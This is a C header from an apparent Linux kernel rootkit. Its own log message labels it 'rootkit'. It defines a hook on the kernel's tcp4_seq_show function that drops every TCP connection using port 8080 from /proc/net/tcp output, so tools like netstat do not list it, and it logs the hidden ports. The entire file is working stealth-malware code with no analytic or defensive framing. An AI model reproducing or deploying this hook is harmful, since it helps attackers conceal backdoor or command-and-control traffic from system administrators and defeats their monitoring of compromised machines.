#ifndef _TCP4_SEQ_SHOW_H_
#define _TCP4_SEQ_SHOW_H_


static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static notrace asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock *is;
    long ret;
    unsigned short port = htons(8080);

    if (v != SEQ_START_TOKEN) {
		is = (struct inet_sock *)v;
		if (port == is->inet_sport || port == is->inet_dport) {
			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
				   ntohs(is->inet_sport), ntohs(is->inet_dport));
			return 0;
		}
	}

	ret = orig_tcp4_seq_show(seq, v);
	return ret;
}

#endif
